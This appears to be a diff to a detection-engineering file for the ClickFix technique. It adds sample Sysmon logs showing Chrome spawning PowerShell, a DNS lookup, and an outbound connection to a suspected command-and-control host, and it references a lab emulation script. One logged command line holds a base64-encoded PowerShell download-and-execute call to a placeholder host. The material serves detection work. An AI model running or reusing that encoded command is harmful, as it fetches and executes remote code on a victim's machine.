@@ -205,3 +205,67 @@ KnownBypasses:
     Mitigation: Enforce application allowlisting on macOS; restrict terminal access for non-technical users
     Detection: "On macOS, monitor for osascript or bash spawned from browser processes (Sysmon for Linux/macOS EID 1; Jamf/EDR telemetry); the parent-child relationship and outbound connection pattern is identical to the Windows case"
 
+
+RawLogs:
+  - Type: Sysmon
+    EventId: 1
+    Source: Microsoft-Windows-Sysmon/Operational
+    Description: PowerShell spawned by Chrome with encoded command — the core ClickFix indicator
+    MatchedRules: [Research, Hunt, Analyst]
+    Sample: |
+      EventID: 1 (Process Create)
+      UtcTime: 2024-11-03 14:52:17.442
+      ProcessGuid: {b2c3d4e5-2345-6789-bcde-f01234567890}
+      ProcessId: 7124
+      Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      CommandLine: powershell.exe -NonInteractive -NoProfile -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjADIALQBkAG8AbQBhAGkAbgAvAHAAYQB5AGwAbwBhAGQAJwApAA==
+      CurrentDirectory: C:\Users\jsmith\
+      ParentProcessId: 6892
+      ParentImage: C:\Program Files\Google\Chrome\Application\chrome.exe
+      ParentCommandLine: "C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer
+      # Key signal: ParentImage=chrome.exe + CommandLine contains -EncodedCommand
+      # User copied "fix" command from malicious page, pasted into Run dialog
+
+  - Type: Sysmon
+    EventId: 22
+    Source: Microsoft-Windows-Sysmon/Operational
+    Description: DNS query from PowerShell to attacker C2 domain — DNS resolution phase
+    MatchedRules: [Research, Analyst]
+    Sample: |
+      EventID: 22 (DNS query)
+      UtcTime: 2024-11-03 14:52:18.031
+      ProcessGuid: {b2c3d4e5-2345-6789-bcde-f01234567890}
+      ProcessId: 7124
+      QueryName: update-cdn77.net
+      QueryStatus: 0
+      QueryResults: type: 5 cdn-update-service.net;::ffff:185.220.101.47;
+      Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      # Non-browser process making DNS query for a newly registered domain
+
+  - Type: Sysmon
+    EventId: 3
+    Source: Microsoft-Windows-Sysmon/Operational
+    Description: Outbound network connection from PowerShell to C2 — payload download/beacon
+    MatchedRules: [Research, Hunt, Analyst]
+    Sample: |
+      EventID: 3 (NetworkConnect)
+      UtcTime: 2024-11-03 14:52:18.247
+      ProcessGuid: {b2c3d4e5-2345-6789-bcde-f01234567890}
+      ProcessId: 7124
+      Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      User: CORP\jsmith
+      Protocol: tcp
+      Initiated: true
+      SourceIp: 10.10.1.87
+      SourcePort: 54221
+      DestinationIp: 185.220.101.47
+      DestinationHostname: update-cdn77.net
+      DestinationPort: 443
+      # powershell.exe connecting to non-RFC1918 IP within seconds of parent=chrome.exe launch
+
+EmulationScript:
+  File: emulation/clickfix-techniques/emulate.ps1
+  Language: powershell
+  Description: Simulates ClickFix interpreter execution with encoded command and outbound connection
+  SafetyNotes: Run in isolated lab VM only. Makes a benign outbound HTTP request to example.com.
+  AtomicRef: T1204.004
